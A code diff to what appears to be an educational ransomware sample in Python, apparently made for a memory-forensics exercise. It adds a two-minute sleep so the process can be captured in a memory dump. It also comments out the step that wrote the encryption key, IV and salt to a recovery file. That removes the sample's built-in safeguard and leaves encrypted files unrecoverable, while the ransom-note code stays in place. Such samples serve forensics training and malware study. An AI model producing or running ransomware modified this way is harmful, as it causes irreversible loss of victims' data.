@@ -9,6 +9,7 @@
 # This program is intended for educational purposes only.
 
 import os
+import time
 import winreg
 from pathlib import Path
 from textwrap import dedent
@@ -157,18 +158,22 @@ if __name__ == "__main__":
     with open(downloads_path / "ransom.txt", "wt") as fp3:
         fp3.write(ransom_note)
 
+    # Allow ransomware to run in the background for a bit before exiting (allows
+    # it to be caught in the volatile memory dump)
+    time.sleep(120)
+
     # Just for safety - we write the key and IV to a file in the Downloads
     # folder. Obviously a real ransomware won't do this, but this is to help
     # with recovery if you accidentally run this on a real machine.
-    with open(downloads_path / f"key_{get_machine_guid()}.txt", "wt") as fp4:
-        key_data = dedent(
-            f"""
-            Key: {key.hex()}
-            IV: {iv.hex()}
-            Salt: {salt.hex()}
-            Machine GUID: {get_machine_guid()}
-            """
-        )
-        fp4.write(key_data.encode("utf-8").hex() + "\n\n")
+    # with open(downloads_path / f"key_{get_machine_guid()}.txt", "wt") as fp4:
+    #     key_data = dedent(
+    #         f"""
+    #         Key: {key.hex()}
+    #         IV: {iv.hex()}
+    #         Salt: {salt.hex()}
+    #         Machine GUID: {get_machine_guid()}
+    #         """
+    #     )
+    #     fp4.write(key_data.encode("utf-8").hex() + "\n\n")
 
-        fp4.write("If the key and IV are lost, you can decode the parameters above.")
+    #     fp4.write("If the key and IV are lost, you can decode the parameters above.")
